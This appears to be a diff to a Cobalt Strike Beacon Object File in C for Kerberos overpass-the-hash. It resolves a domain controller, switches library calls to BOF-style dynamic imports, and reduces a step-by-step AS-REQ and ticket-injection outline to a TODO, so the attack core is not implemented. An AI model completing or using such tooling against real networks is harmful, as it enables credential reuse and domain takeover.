@@ -31,12 +31,18 @@ DECLSPEC_IMPORT void WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);
 DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, void**);
 DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
 
+DECLSPEC_IMPORT int  WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
+DECLSPEC_IMPORT int  WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
+
+DECLSPEC_IMPORT int __cdecl MSVCRT$sscanf(const char*, const char*, ...);
+DECLSPEC_IMPORT char* __cdecl MSVCRT$strncpy(char*, const char*, size_t);
+
 static int hex_to_bytes(const char *hex, unsigned char *out, int max_len) {
     int len = (int)strlen(hex) / 2;
     if (len > max_len) len = max_len;
     for (int i = 0; i < len; i++) {
         unsigned int byte;
-        sscanf(hex + i * 2, "%2x", &byte);
+        MSVCRT$sscanf(hex + i * 2, "%2x", &byte);
         out[i] = (unsigned char)byte;
     }
     return len;
@@ -81,10 +87,10 @@ void go(char *args, int args_len) {
     /* Auto-discover DC if needed */
     char aDC[256] = {0};
     if (dc && *dc) {
-        strncpy(aDC, dc, 255);
+        MSVCRT$strncpy(aDC, dc, 255);
     } else {
         wchar_t wDomain[256];
-        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
+        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
         void *dcInfo = NULL;
         if (NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo) == 0 && dcInfo) {
             /* DOMAIN_CONTROLLER_INFOW: first field is DomainControllerName (LPWSTR) */
@@ -92,7 +98,7 @@ void go(char *args, int args_len) {
             if (dcName) {
                 /* Skip leading \\\\ */
                 if (dcName[0] == L'\\' && dcName[1] == L'\\') dcName += 2;
-                WideCharToMultiByte(CP_UTF8, 0, dcName, -1, aDC, 255, NULL, NULL);
+                KERNEL32$WideCharToMultiByte(CP_UTF8, 0, dcName, -1, aDC, 255, NULL, NULL);
             }
             NETAPI32$NetApiBufferFree(dcInfo);
         }
@@ -107,24 +113,12 @@ void go(char *args, int args_len) {
     /*
      * Build AS-REQ with PA-ENC-TIMESTAMP:
      *
-     * 1. Get current time as GeneralizedTime
-     * 2. Encode PA-ENC-TS-ENC (timestamp + usec) in ASN.1 DER
-     * 3. Encrypt with key:
-     *    - etype 23 (RC4): HMAC-MD5 key derivation + RC4 encryption
-     *    - etype 18 (AES256): AES256-CTS-HMAC-SHA1 per RFC 3962
-     * 4. Build PA-DATA { padata-type=2(PA-ENC-TIMESTAMP), padata-value=EncryptedData }
-     * 5. Build full AS-REQ with padata, cname, realm, sname(krbtgt/REALM),
-     *    till, nonce, etype preference list
-     * 6. Send to KDC port 88 (TCP: 4-byte length prefix + AS-REQ)
-     * 7. Parse AS-REP: extract ticket + enc-part → decrypt with key → session key
-     * 8. Package as KRB-CRED (.kirbi) and inject via KERB_SUBMIT_TKT_REQUEST
+     * TODO: Full implementation of AS-REQ construction + AS-REP parsing
+     * This requires ~400 lines of ASN.1 DER encoding + crypto operations
      */
 
     WSADATA wsa;
     WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa);
-
-    /* TODO: Full implementation of AS-REQ construction + AS-REP parsing */
-    /* This requires ~400 lines of ASN.1 DER encoding + crypto operations */
 
     BeaconPrintf(CALLBACK_OUTPUT,
         "[*] Connecting to KDC %s:88...\n"
